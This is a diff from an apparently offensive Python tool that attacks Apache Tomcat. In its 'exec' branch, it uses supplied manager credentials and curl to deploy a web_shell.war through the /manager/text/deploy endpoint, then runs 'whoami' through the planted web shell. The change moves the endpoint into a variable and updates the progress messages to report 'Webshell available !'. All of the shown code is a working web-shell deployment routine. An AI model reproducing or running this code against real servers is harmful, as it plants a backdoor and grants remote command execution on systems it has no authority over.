@@ -142,16 +142,19 @@ class AuthenticatedAttack(Tomcat):
             case "exec":
                 response = requests.get(url=f"{self.url}/web_shell/index.jsp")
 
+                endpoint = '/manager/text/deploy?path=/web_shell'
+
                 if response.status_code != 200:
-                    command = f"curl --upload-file resources/web_shell.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/web_shell'"
+                    command = f"curl --upload-file resources/web_shell.war -u '{self.username}:{self.password}' '{self.url}{endpoint}'"
                     subprocess.run(command, shell=True, check=True, capture_output=True)
+                    output.message(state="ongoing", description="Spawning webshell...", url=endpoint)
 
                 response = self.execute_webshell_cmd(cmd="whoami")
 
                 if response:
-                    output.message(state="ongoing", description="Spawning webshell...", url="")
+                    output.message(state="success", description="Webshell available !", url=endpoint)
                 else:
-                    output.message(state="failed", description="An error occur with the webshell", url="")
+                    output.message(state="failed", description="An error occur with the webshell", url=endpoint)
                     output.message(state="exit", description="Jobs finished ? Jobs not finished", url="")
                     return
 
